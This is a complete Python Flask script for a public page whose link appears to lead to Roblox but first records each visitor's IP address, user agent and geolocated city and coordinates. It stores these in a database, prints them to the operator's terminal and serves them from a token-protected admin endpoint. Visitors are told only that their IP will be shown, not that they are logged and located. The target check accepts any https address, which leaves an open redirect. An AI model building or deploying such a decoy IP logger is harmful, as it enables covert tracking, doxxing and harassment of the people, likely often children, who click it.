#!/usr/bin/env python3
"""
Public-access Flask app:
- Shows visible link to Roblox
- Displays visitor's real public IP
- Logs timestamp, IP, user-agent, approximate geo (via ip-api.com)
- Stores logs in SQLite (clicks.db)
- Prints logs to terminal
- Redirects visitors to Roblox after 3 seconds
- Admin endpoint /admin/recent requires ADMIN_TOKEN
"""

import os
import json
import sqlite3
from datetime import datetime
from urllib.parse import urlencode, urlparse
from flask import Flask, request, g, abort, jsonify
from markupsafe import escape
import requests  # pip install flask requests markupsafe

# ---------- Configuration ----------
DB_PATH = os.environ.get("CLICK_DB_PATH", "clicks.db")
ADMIN_TOKEN = os.environ.get("ADMIN_TOKEN")  # required for /admin/recent
DEFAULT_TARGET = "https://roblox.com"
ALLOWED_PROTOCOLS = {"https:"}

app = Flask(__name__)
app.config["TRUSTED_PROXIES"] = True  # needed if behind a proxy

# ---------- Database helpers ----------
def get_db():
    db = getattr(g, "_db", None)
    if db is None:
        db = sqlite3.connect(DB_PATH, detect_types=sqlite3.PARSE_DECLTYPES)
        db.row_factory = sqlite3.Row
        g._db = db
    return db

def init_db():
    db = get_db()
    db.execute("""
    CREATE TABLE IF NOT EXISTS clicks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ts TEXT NOT NULL,
        ip TEXT NOT NULL,
        user_agent TEXT,
        target TEXT NOT NULL,
        country TEXT,
        region TEXT,
        city TEXT,
        lat REAL,
        lon REAL,
        raw_geo TEXT
    )
    """)
    db.commit()

@app.teardown_appcontext
def close_db(exception):
    db = getattr(g, "_db", None)
    if db is not None:
        db.close()

# ---------- Utilities ----------
def get_client_ip():
    # Prefer X-Forwarded-For for proxies
    xff = request.headers.get("X-Forwarded-For", "")
    if xff:
        return xff.split(",")[0].strip()
    return request.remote_addr or "unknown"

def is_valid_target(url_text):
    try:
        parsed = urlparse(url_text)
        return parsed.scheme + ":" in ALLOWED_PROTOCOLS or parsed.scheme in ALLOWED_PROTOCOLS
    except Exception:
        return False

def geo_lookup(ip):
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}",
            params={"fields":"status,country,regionName,city,lat,lon,query,message"},
            timeout=3
        )
        j = r.json()
        if j.get("status") == "success":
            return j
        return {"status": "fail", "message": j.get("message", "unknown")}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# ---------- Routes ----------
@app.route("/")
def index():
    href = "/r?" + urlencode({"target": DEFAULT_TARGET})
    return f"""
    <!doctype html>
    <html>
      <head><meta charset="utf-8"><title>Continue</title></head>
      <body style="font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial; padding:36px;">
        <p>Click the link below to continue:</p>
        <p><a href="{escape(href)}">{escape(DEFAULT_TARGET)}</a></p>
        <p style="font-size:0.9em; color:#666;">Your public IP will be displayed before redirecting.</p>
      </body>
    </html>
    """

@app.route("/r")
def redirect_and_log():
    target = request.args.get("target", DEFAULT_TARGET)
    if not is_valid_target(target):
        return "Invalid target URL", 400

    ip = get_client_ip()  # This will be the visitor's public IP
    ua = request.headers.get("User-Agent", None)
    ts = datetime.utcnow().isoformat() + "Z"
    geo = geo_lookup(ip)

    # Print to terminal
    print(f"[{ts}] Click: IP={ip}, User-Agent={ua}")
    if geo.get("status") == "success":
        print(f"Location: {geo.get('city')}, {geo.get('regionName')}, {geo.get('country')}")
    else:
        print(f"Geo lookup failed: {geo.get('message')}")

    # Save to DB
    db = get_db()
    try:
        db.execute("""
            INSERT INTO clicks (ts, ip, user_agent, target, country, region, city, lat, lon, raw_geo)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            ts, ip, ua, target,
            geo.get("country") if geo.get("status")=="success" else None,
            geo.get("regionName") if geo.get("status")=="success" else None,
            geo.get("city") if geo.get("status")=="success" else None,
            geo.get("lat") if geo.get("status")=="success" else None,
            geo.get("lon") if geo.get("status")=="success" else None,
            json.dumps(geo)
        ))
        db.commit()
    except Exception as e:
        app.logger.exception("DB insert failed: %s", e)

    # Display visitor's public IP and redirect after 3 seconds
    return f"""
    <!doctype html>
    <html>
      <head><meta charset="utf-8"><title>Redirecting...</title></head>
      <body style="font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial; padding:36px;">
        <p>Visitor public IP: <strong>{escape(ip)}</strong></p>
        <p>Redirecting to <a href="{escape(target)}">{escape(target)}</a> in 3 seconds...</p>
        <script>
          setTimeout(function() {{
            window.location.href = "{escape(target)}";
          }}, 3000);
        </script>
      </body>
    </html>
    """

@app.route("/admin/recent")
def admin_recent():
    token = request.args.get("token")
    if not ADMIN_TOKEN:
        return "Admin access not configured", 403
    if not token or token != ADMIN_TOKEN:
        return abort(403)

    db = get_db()
    rows = db.execute(
        "SELECT id, ts, ip, user_agent, target, country, region, city, lat, lon "
        "FROM clicks ORDER BY id DESC LIMIT 200"
    ).fetchall()
    return jsonify([dict(r) for r in rows])

# ---------- Main ----------
if __name__ == "__main__":
    with app.app_context():
        init_db()

    port = int(os.environ.get("PORT", 3000))
    print(f"Server running publicly on 0.0.0.0:{port} ...")
    app.run(host="0.0.0.0", port=port, debug=False)

